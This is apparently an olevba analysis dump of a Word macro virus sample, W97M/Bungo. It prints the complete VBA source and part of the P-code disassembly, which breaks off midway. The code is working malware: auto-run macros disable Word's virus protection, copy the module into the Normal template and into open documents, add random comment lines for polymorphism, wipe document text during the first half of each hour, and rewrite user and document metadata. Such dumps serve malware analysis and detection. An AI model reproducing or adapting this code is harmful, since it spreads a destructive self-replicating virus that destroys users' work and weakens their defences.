olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Mck.f
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Mck.f - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Bungo.bas 
in file: Virus.MSWord.Mck.f - OLE stream: 'Macros/VBA/Bungo'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'Virus Name: W97M/Bungo
'Author Name: Lucky Warrior
'Copyright (c) 1999 Bgy. Tiguib, O.E.S.
'All rights reserved.

'I dedicate this virus to my roommates, namely:
'Tom, Deo, Allan, ArnoldBig, ArnoldSmall, Mike & Ruel
'
'Thanks Guys!! for everything...
'
'-Lucky Warrior 10 November 1999
'END


Sub AutoOpen()
On Error Resume Next
Call Payload
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
Options.SaveNormalPrompt = False
DocInfect = False
GlobInfect = False
Set GlobalDoc = NormalTemplate
Set ActiveDoc = ActiveDocument
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Bungo" Then
DocInfect = True
End If
Next
For j = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(j).Name = "Bungo" Then
GlobInfect = True
End If
Next
If GlobInfect = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
If DocInfect = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
Application.DisplayAlerts = wdAlertsAll
Call GoToHell
End Sub

Sub AutoNew()
On Error Resume Next
Call Payload
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
Options.SaveNormalPrompt = False
DocInfect = False
GlobInfect = False
Set GlobalDoc = NormalTemplate
Set ActiveDoc = ActiveDocument
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Bungo" Then
DocInfect = True
End If
Next
For j = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(j).Name = "Bungo" Then
GlobInfect = True
End If
Next
If GlobInfect = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
If DocInfect = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
Application.DisplayAlerts = wdAlertsAll
Call GoToHell
End Sub

Sub AutoClose()
On Error Resume Next
Call Payload
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
Options.SaveNormalPrompt = False
DocInfect = False
GlobInfect = False
Set GlobalDoc = NormalTemplate
Set ActiveDoc = ActiveDocument
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Bungo" Then
DocInfect = True
End If
Next
For j = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(j).Name = "Bungo" Then
GlobInfect = True
End If
Next
If GlobInfect = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
If DocInfect = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
Application.DisplayAlerts = wdAlertsAll
Call GoToHell
End Sub

Sub AutoExec()
On Error Resume Next
Call Payload
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
Options.SaveNormalPrompt = False
DocInfect = False
GlobInfect = False
Set GlobalDoc = NormalTemplate
Set ActiveDoc = ActiveDocument
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Bungo" Then
DocInfect = True
End If
Next
For j = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(j).Name = "Bungo" Then
GlobInfect = True
End If
Next
If GlobInfect = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
If DocInfect = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
Application.DisplayAlerts = wdAlertsAll
Call GoToHell
End Sub

Sub FileSaveAs()
On Error Resume Next
Call Payload
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
Options.SaveNormalPrompt = False
DocInfect = False
GlobInfect = False
Set GlobalDoc = NormalTemplate
Set ActiveDoc = ActiveDocument
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Bungo" Then
DocInfect = True
End If
Next
For j = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(j).Name = "Bungo" Then
GlobInfect = True
End If
Next
If GlobInfect = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
If DocInfect = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
Application.DisplayAlerts = wdAlertsAll
Call GoToHell
End Sub

Sub FileSave()
On Error Resume Next
Call Payload
Application.ScreenUpdating = False
Application.DisplayAlerts = wdAlertsNone
Options.VirusProtection = False
DocInfect = False
GlobInfect = False
Set GlobalDoc = NormalTemplate
Set ActiveDoc = ActiveDocument
For i = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(i).Name = "Bungo" Then
DocInfect = True
End If
Next
For j = 1 To NormalTemplate.VBProject.VBComponents.Count
If NormalTemplate.VBProject.VBComponents(j).Name = "Bungo" Then
GlobInfect = True
End If
Next
If GlobInfect = False Then
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
Options.SaveNormalPrompt = False
End If
If DocInfect = False Then
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="Bungo", Object:=wdOrganizerObjectProjectItems
ActiveDoc.SaveAs FileName:=ActiveDoc.Name, FileFormat:=wdFormatTemplate
End If
Application.DisplayAlerts = wdAlertsAll
Call GoToHell
ActiveDocument.Save
End Sub

Sub GoToHell()
On Error Resume Next
Randomize
ActiveLines = Application.VBE.ActiveVBProject.VBComponents("Bungo").CodeModule.CountOfLines
If ActiveLines > 300 Then
With Application.VBE.ActiveVBProject.VBComponents("Bungo").CodeModule
For TheLine = 1 To .CountOfLines
If Left(.Lines(TheLine, 1), 3) = "Rem" Then .DeleteLines TheLine
Next TheLine
End With
Else
With Application.VBE.ActiveVBProject.VBComponents("Bungo").CodeModule
PolySize = Int(Rnd * 10)
For PolyMorphic = 1 To PolySize
PolyString = ""
PolyLines = .CountOfLines
RndLine = Int(Rnd * PolyLines) + 1
StringSize = Int(Rnd * 39) + 1
For SomeString = 1 To StringSize
PolyString = PolyString & Chr(65 + Int(Rnd * 22)) & Chr(122 - Int(Rnd * 22))
Next SomeString
.InsertLines RndLine, "Rem " & PolyString
Next PolyMorphic
End With
End If
End Sub

Sub Payload()
  On Error Resume Next
    If Day(Now) = Day(Now) And Minute(Now) <= 30 Then
    Selection.Wholestory
    Selection.Cut
    End If
  ActiveDocument.SaveAs ActiveDocument.FullName
  CommandBars("tools").Controls("Macro").Delete
  CommandBars("tools").Controls("Templates and add-ins...").Delete
  Application.Username = "Lucky Warrior"
  Application.UserInitials = "LW"
  Application.UserAddress = "Bgy. Tiguib, O.E.S."
  With Dialogs(wdDialogFileSummaryInfo)
  .Author = "Lucky Warrior"
  .Keywords = "W97M/Bungo"
  .Comments = "More to come..."
  .Execute
  End With
End Sub



-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Mck.f
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 903 bytes
' Macros/VBA/Bungo - 11827 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0016 "Virus Name: W97M/Bungo"
' Line #1:
' 	QuoteRem 0x0000 0x001A "Author Name: Lucky Warrior"
' Line #2:
' 	QuoteRem 0x0000 0x0026 "Copyright (c) 1999 Bgy. Tiguib, O.E.S."
' Line #3:
' 	QuoteRem 0x0000 0x0014 "All rights reserved."
' Line #4:
' Line #5:
' 	QuoteRem 0x0000 0x002E "I dedicate this virus to my roommates, namely:"
' Line #6:
' 	QuoteRem 0x0000 0x0034 "Tom, Deo, Allan, ArnoldBig, ArnoldSmall, Mike & Ruel"
' Line #7:
' 	QuoteRem 0x0000 0x0000 ""
' Line #8:
' 	QuoteRem 0x0000 0x001F "Thanks Guys!! for everything..."
' Line #9:
' 	QuoteRem 0x0000 0x0000 ""
' Line #10:
' 	QuoteRem 0x0000 0x001F "-Lucky Warrior 10 November 1999"
' Line #11:
' 	QuoteRem 0x0000 0x0003 "END"
' Line #12:
' Line #13:
' Line #14:
' 	FuncDefn (Sub AutoOpen())
' Line #15:
' 	OnError (Resume Next) 
' Line #16:
' 	ArgsCall (Call) Payload 0x0000 
' Line #17:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #18:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #19:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #20:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #21:
' 	LitVarSpecial (False)
' 	St DocInfect 
' Line #22:
' 	LitVarSpecial (False)
' 	St GlobInfect 
' Line #23:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set GlobalDoc 
' Line #24:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ActiveDoc 
' Line #25:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #26:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Bungo"
' 	Eq 
' 	IfBlock 
' Line #27:
' 	LitVarSpecial (True)
' 	St DocInfect 
' Line #28:
' 	EndIfBlock 
' Line #29:
' 	StartForVariable 
' 	Next 
' Line #30:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #31:
' 	Ld j 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Bungo"
' 	Eq 
' 	IfBlock 
' Line #32:
' 	LitVarSpecial (True)
' 	St GlobInfect 
' Line #33:
' 	EndIfBlock 
' Line #34:
' 	StartForVariable 
' 	Next 
' Line #35:
' 	Ld GlobInfect 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #36:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Bungo"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #37:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #38:
' 	EndIfBlock 
' Line #39:
' 	Ld DocInfect 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #40:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Bungo"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #41:
' 	Ld ActiveDoc 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDoc 
' 	ArgsMemCall SaveAs 0x0002 
' Line #42:
' 	EndIfBlock 
' Line #43:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #44:
' 	ArgsCall (Call) GoToHell 0x0000 
' Line #45:
' 	EndSub 
' Line #46:
' Line #47:
' 	FuncDefn (Sub AutoNew())
' Line #48:
' 	OnError (Resume Next) 
' Line #49:
' 	ArgsCall (Call) Payload 0x0000 
' Line #50:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #51:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #52:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #53:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #54:
' 	LitVarSpecial (False)
' 	St DocInfect 
' Line #55:
' 	LitVarSpecial (False)
' 	St GlobInfect 
' Line #56:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set GlobalDoc 
' Line #57:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ActiveDoc 
' Line #58:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #59:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Bungo"
' 	Eq 
' 	IfBlock 
' Line #60:
' 	LitVarSpecial (True)
' 	St DocInfect 
' Line #61:
' 	EndIfBlock 
' Line #62:
' 	StartForVariable 
' 	Next 
' Line #63:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #64:
' 	Ld j 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Bungo"
' 	Eq 
' 	IfBlock 
' Line #65:
' 	LitVarSpecial (True)
' 	St GlobInfect 
' Line #66:
' 	EndIfBlock 
' Line #67:
' 	StartForVariable 
' 	Next 
' Line #68:
' 	Ld GlobInfect 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #69:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Bungo"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #70:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #71:
' 	EndIfBlock 
' Line #72:
' 	Ld DocInfect 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #73:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Bungo"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #74:
' 	Ld ActiveDoc 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDoc 
' 	ArgsMemCall SaveAs 0x0002 
' Line #75:
' 	EndIfBlock 
' Line #76:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #77:
' 	ArgsCall (Call) GoToHell 0x0000 
' Line #78:
' 	EndSub 
' Line #79:
' Line #80:
' 	FuncDefn (Sub AutoClose())
' Line #81:
' 	OnError (Resume Next) 
' Line #82:
' 	ArgsCall (Call) Payload 0x0000 
' Line #83:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #84:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #85:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #86:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #87:
' 	LitVarSpecial (False)
' 	St DocInfect 
' Line #88:
' 	LitVarSpecial (False)
' 	St GlobInfect 
' Line #89:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set GlobalDoc 
' Line #90:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ActiveDoc 
' Line #91:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #92:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Bungo"
' 	Eq 
' 	IfBlock 
' Line #93:
' 	LitVarSpecial (True)
' 	St DocInfect 
' Line #94:
' 	EndIfBlock 
' Line #95:
' 	StartForVariable 
' 	Next 
' Line #96:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #97:
' 	Ld j 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Bungo"
' 	Eq 
' 	IfBlock 
' Line #98:
' 	LitVarSpecial (True)
' 	St GlobInfect 
' Line #99:
' 	EndIfBlock 
' Line #100:
' 	StartForVariable 
' 	Next 
' Line #101:
' 	Ld GlobInfect 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #102:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Bungo"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #103:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #104:
' 	EndIfBlock 
' Line #105:
' 	Ld DocInfect 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #106:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Bungo"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #107:
' 	Ld ActiveDoc 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDoc 
' 	ArgsMemCall SaveAs 0x0002 
' Line #108:
' 	EndIfBlock 
' Line #109:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #110:
' 	ArgsCall (Call) GoToHell 0x0000 
' Line #111:
' 	EndSub 
' Line #112:
' Line #113:
' 	FuncDefn (Sub AutoExec())
' Line #114:
' 	OnError (Resume Next) 
' Line #115:
' 	ArgsCall (Call) Payload 0x0000 
' Line #116:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #117:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #118:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #119:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #120:
' 	LitVarSpecial (False)
' 	St DocInfect 
' Line #121:
' 	LitVarSpecial (False)
' 	St GlobInfect 
' Line #122:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set GlobalDoc 
' Line #123:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ActiveDoc 
' Line #124:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #125:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Bungo"
' 	Eq 
' 	IfBlock 
' Line #126:
' 	LitVarSpecial (True)
' 	St DocInfect 
' Line #127:
' 	EndIfBlock 
' Line #128:
' 	StartForVariable 
' 	Next 
' Line #129:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #130:
' 	Ld j 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Bungo"
' 	Eq 
' 	IfBlock 
' Line #131:
' 	LitVarSpecial (True)
' 	St GlobInfect 
' Line #132:
' 	EndIfBlock 
' Line #133:
' 	StartForVariable 
' 	Next 
' Line #134:
' 	Ld GlobInfect 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #135:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Bungo"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #136:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #137:
' 	EndIfBlock 
' Line #138:
' 	Ld DocInfect 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #139:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Bungo"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #140:
' 	Ld ActiveDoc 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDoc 
' 	ArgsMemCall SaveAs 0x0002 
' Line #141:
' 	EndIfBlock 
' Line #142:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #143:
' 	ArgsCall (Call) GoToHell 0x0000 
' Line #144:
' 	EndSub 
' Line #145:
' Line #146:
' 	FuncDefn (Sub FileSaveAs())
' Line #147:
' 	OnError (Resume Next) 
' Line #148:
' 	ArgsCall (Call) Payload 0x0000 
' Line #149:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #150:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #151:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #152:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #153:
' 	LitVarSpecial (False)
' 	St DocInfect 
' Line #154:
' 	LitVarSpecial (False)
' 	St GlobInfect 
' Line #155:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set GlobalDoc 
' Line #156:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ActiveDoc 
' Line #157:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #158:
' 	Ld i 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Bungo"
' 	Eq 
' 	IfBlock 
' Line #159:
' 	LitVarSpecial (True)
' 	St DocInfect 
' Line #160:
' 	EndIfBlock 
' Line #161:
' 	StartForVariable 
' 	Next 
' Line #162:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
' 	For 
' Line #163:
' 	Ld j 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd New 
' 	LitStr 0x0005 "Bungo"
' 	Eq 
' 	IfBlock 
' Line #164:
' 	LitVarSpecial (True)
' 	St GlobInfect 
' Line #165:
' 	EndIfBlock 
' Line #166:
' 	StartForVariable 
' 	Next 
' Line #167:
' 	Ld GlobInfect 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #168:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Bungo"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #169:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #170:
' 	EndIfBlock 
' Line #171:
' 	Ld DocInfect 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #172:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x0005 "Bungo"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #173:
' 	Ld ActiveDoc 
' 	MemLd New 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDoc 
' 	ArgsMemCall SaveAs 0x0002 
' Line #174:
' 	EndIfBlock 
' Line #175:
' 	Ld wdAlertsAll 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #176:
' 	ArgsCall (Call) GoToHell 0x0000 
' Line #177:
' 	EndSub 
' Line #178:
' Line #179:
' 	FuncDefn (Sub FileSave())
' Line #180:
' 	OnError (Resume Next) 
' Line #181:
' 	ArgsCall (Call) Payload 0x0000 
' Line #182:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #183:
' 	Ld wdAlertsNone 
' 	Ld Application 
' 	MemSt DisplayAlerts 
' Line #184:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #185:
' 	LitVarSpecial (False)
' 	St DocInfect 
' Line #186:
' 	LitVarSpecial (False)
' 	St GlobInfect 
' Line #187:
' 	SetStmt 
' 	Ld NormalTemplate 
' 	Set GlobalDoc 
' Line #188:
' 	SetStmt 
' 	Ld ActiveDocument 
' 	Set ActiveDoc 
' Line #189:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	MemLd Count 
